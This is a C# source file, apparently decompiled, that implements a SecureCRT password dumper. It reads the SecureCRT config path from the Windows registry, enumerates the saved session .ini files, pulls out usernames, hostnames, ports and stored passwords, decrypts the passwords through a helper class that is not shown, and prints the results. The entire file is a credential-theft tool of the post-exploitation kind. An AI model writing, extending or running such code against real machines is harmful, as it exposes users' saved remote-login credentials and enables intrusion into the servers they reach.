using Microsoft.Win32;
using System;
using System.IO;

internal class SecureCrtPwd
{
    public static void SecureCrtCrypt()
    {
        string a_ = "";
        string name = "Software\\VanDyke\\SecureCRT";
        RegistryKey registryKey = Registry.CurrentUser.OpenSubKey(name);
        if (registryKey == null)
        {
            Console.WriteLine("[-] SecureCRT Not Found");
            return;
        }
        string text = Path.Combine(registryKey.GetValue("Config Path").ToString(), "Sessions");
        if (Directory.Exists(text))
        {
            Console.WriteLine("[+] Found SecureCRT: " + text);
            FileInfo[] files = new DirectoryInfo(text).GetFiles("*.ini", SearchOption.AllDirectories);
            foreach (FileInfo fileInfo in files)
            {
                if (fileInfo.Name.ToLower().Equals("__FolderData__.ini".ToLower()))
                {
                    continue;
                }
                string[] array = File.ReadAllLines(fileInfo.FullName);
                j j = new j();
                string[] array2 = array;
                foreach (string text2 in array2)
                {
                    if (text2.IndexOf('=') != -1)
                    {
                        string text3 = text2.Split('=')[0];
                        string a_2 = text2.Split('=')[1];
                        if (text3.ToLower().Contains("S:\"Username\"".ToLower()))
                        {
                            j.c(a_2);
                        }
                        else if (text3.ToLower().Contains("S:\"Password\"".ToLower()))
                        {
                            j.a(a_2, "v1");
                        }
                        else if (text3.ToLower().Contains("S:\"Password V2\"".ToLower()))
                        {
                            j.a(a_2, "v2", a_);
                        }
                        else if (text3.ToLower().Contains("S:\"Hostname\"".ToLower()))
                        {
                            j.b(a_2);
                        }
                        else if (text3.ToLower().Contains("S:\"Protocol Name\"".ToLower()))
                        {
                            j.d(a_2);
                        }
                        else if (text3.ToLower().Contains("D:\"Port\"".ToLower()))
                        {
                            j.e(a_2);
                        }
                        else if (text3.ToLower().Contains("D:\"[SSH1] Port\"".ToLower()))
                        {
                            j.f(a_2);
                        }
                        else if (text3.ToLower().Contains("D:\"[SSH2] Port\"".ToLower()))
                        {
                            j.g(a_2);
                        }
                    }
                }
                j.i();
                Console.WriteLine("[+] Found " + fileInfo.FullName.Substring(text.Length));
                Console.WriteLine(j);
                Console.WriteLine();
            }
        }
        else
        {
            Console.WriteLine("[-] SecureCRT Config Path Not Exists: " + text);
        }
    }
}
